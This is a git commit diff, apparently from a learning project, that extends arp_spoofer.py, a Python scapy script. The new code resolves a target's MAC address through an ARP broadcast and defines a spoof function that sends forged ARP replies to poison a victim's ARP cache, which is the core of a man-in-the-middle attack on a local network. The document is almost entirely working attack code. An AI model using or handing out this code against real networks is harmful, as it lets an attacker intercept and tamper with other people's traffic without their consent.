86684699841da371ced60e999e732abadacaab4c
jaketbdev <72199858+jaketbdev@users.noreply.github.com>
2021-05-25 17:04:37 +0100

    Created get_mac function to get the MAC address of the target machine

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -1,11 +1,20 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
-from source_details import router_source_ip
-from target_details import target_ip, target_MAC
 
-packet = scapy.ARP(
-            op=2,
-            pdst=target_ip,
-            hwdst=target_MAC,
-            psrc=router_source_ip)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return (answered_list[0][1].hwsrc)
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(
+                op=2,
+                pdst=target_ip,
+                hwdst=target_mac,
+                psrc=spoof_ip)
+    scapy.send(packet)
+get_mac("10.0.2.15/24")
